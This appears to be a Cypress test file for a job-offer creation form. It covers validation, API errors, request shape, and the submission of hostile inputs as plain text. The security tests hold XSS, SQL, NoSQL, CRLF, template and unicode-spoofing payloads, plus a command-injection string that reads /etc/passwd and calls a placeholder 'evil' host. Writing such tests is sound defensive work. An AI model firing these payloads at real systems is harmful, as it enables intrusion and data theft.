describe('New Offer', () => {
  const fillValidForm = () => {
    cy.get('#title').type('QA Offer');
    cy.get('#description').type('Automation description');
  };

  beforeEach(() => {
    cy.visit('/offers/new-offer');
  });

  const submitWithPayloadAndAssertRequest = (title: string, description: string, alias: string) => {
    cy.window().then((windowObject) => {
      cy.stub(windowObject, 'alert').as('alert');
      cy.stub(windowObject.console, 'error').as('consoleError');
    });

    cy.intercept('POST', '**/v1/offers', (request) => {
      expect(request.body).to.deep.equal({ title, description });

      request.reply({
        id: '123',
        title,
        description
      });
    }).as(alias);

    cy.intercept('POST', '**/v1/offers/123/prepare-formatted-description', { ok: true }).as('formatOfferSecurity');

    cy.get('#title').clear().type(title, { parseSpecialCharSequences: false });
    cy.get('#description').clear().type(description, { parseSpecialCharSequences: false });
    cy.get('button[type="submit"]').click();

    cy.wait(`@${alias}`);
    cy.wait('@formatOfferSecurity');
    cy.get('@alert').should('not.have.been.called');
    cy.url().should('include', '/offers');
  };

  it('creates offer and redirects', () => {
    cy.intercept('POST', '**/v1/offers', { id: '123', title: 'QA Offer', description: 'Desc' }).as('createOffer');
    cy.intercept('POST', '**/v1/offers/123/prepare-formatted-description', { ok: true }).as('formatOffer');

    fillValidForm();
    cy.get('button[type="submit"]').click();

    cy.wait('@createOffer');
    cy.wait('@formatOffer');
    cy.url().should('include', '/offers');
  });

  it('keeps submit disabled until form is valid', () => {
    cy.get('button[type="submit"]').should('be.disabled');

    cy.get('#title').type('Only title');
    cy.get('button[type="submit"]').should('be.disabled');

    cy.get('#description').type('Now description is present');
    cy.get('button[type="submit"]').should('not.be.disabled');
  });

  it('rejects title longer than 200 characters', () => {
    const veryLongTitle = 'A'.repeat(201);

    cy.get('#title').type(veryLongTitle);
    cy.get('#description').type('Description is valid');

    cy.get('button[type="submit"]').should('be.disabled');
    cy.contains('small', /maximum|maxlength|200/i).should('exist');
  });

  it('stays on page when create offer API fails', () => {
    cy.intercept('POST', '**/v1/offers', {
      statusCode: 500,
      body: { message: 'Internal server error' }
    }).as('createOfferFail');

    fillValidForm();
    cy.get('button[type="submit"]').click();

    cy.wait('@createOfferFail');
    cy.url().should('include', '/offers/new-offer');
  });

  it('stays on page when formatted description API fails', () => {
    cy.intercept('POST', '**/v1/offers', { id: '123', title: 'QA Offer', description: 'Desc' }).as('createOffer');
    cy.intercept('POST', '**/v1/offers/123/prepare-formatted-description', {
      statusCode: 500,
      body: { message: 'Formatting failed' }
    }).as('formatOfferFail');

    fillValidForm();
    cy.get('button[type="submit"]').click();

    cy.wait('@createOffer');
    cy.wait('@formatOfferFail');
    cy.url().should('include', '/offers/new-offer');
  });

  it('handles potentially malicious input as plain text payload', () => {
    const maliciousTitle = '<img src=x onerror=alert(1)>';
    const maliciousDescription = '<script>window.hacked=true</script>';

    submitWithPayloadAndAssertRequest(maliciousTitle, maliciousDescription, 'createOfferSecurityXss');
  });

  describe('security payloads', () => {
    it('submits SQL injection-like payload as plain text', () => {
      const title = "' OR '1'='1";
      const description = "Senior QA role'; DROP TABLE offers; --";

      submitWithPayloadAndAssertRequest(title, description, 'createOfferSecuritySql');
    });

    it('submits NoSQL injection-like payload as plain text', () => {
      const title = '{"$ne":null}';
      const description = '{"$gt":""}';

      submitWithPayloadAndAssertRequest(title, description, 'createOfferSecurityNoSql');
    });

    it('submits command injection-like payload as plain text', () => {
      const title = 'QA Lead && cat /etc/passwd';
      const description = 'Automation owner | powershell Invoke-WebRequest http://evil';

      submitWithPayloadAndAssertRequest(title, description, 'createOfferSecurityCmd');
    });

    it('submits CRLF/header injection-like payload as plain text', () => {
      const title = 'QA Lead%0d%0aSet-Cookie:session=attacker';
      const description = 'Description with CRLF\\r\\nX-Injected: true';

      submitWithPayloadAndAssertRequest(title, description, 'createOfferSecurityCrlf');
    });

    it('submits template injection-like payload as plain text', () => {
      const title = '${7*7}';
      const description = '{{constructor.constructor("return process")()}}';

      submitWithPayloadAndAssertRequest(title, description, 'createOfferSecurityTemplate');
    });

    it('submits unicode obfuscation payload as plain text', () => {
      const title = 'QA\u202Egnp.exe';
      const description = '<scr\u0131pt>alert(1)</scr\u0131pt>';

      submitWithPayloadAndAssertRequest(title, description, 'createOfferSecurityUnicode');
    });

    it('does not send unexpected extra fields in request body', () => {
      const title = 'Role title';
      const description = 'Role description';

      cy.intercept('POST', '**/v1/offers', (request) => {
        expect(Object.keys(request.body).sort()).to.deep.equal(['description', 'title']);
        request.reply({ id: '123', title, description });
      }).as('createOfferRequestShape');

      cy.intercept('POST', '**/v1/offers/123/prepare-formatted-description', { ok: true }).as('formatOfferRequestShape');

      cy.get('#title').type(title);
      cy.get('#description').type(description);
      cy.get('button[type="submit"]').click();

      cy.wait('@createOfferRequestShape');
      cy.wait('@formatOfferRequestShape');
      cy.url().should('include', '/offers');
    });
  });
});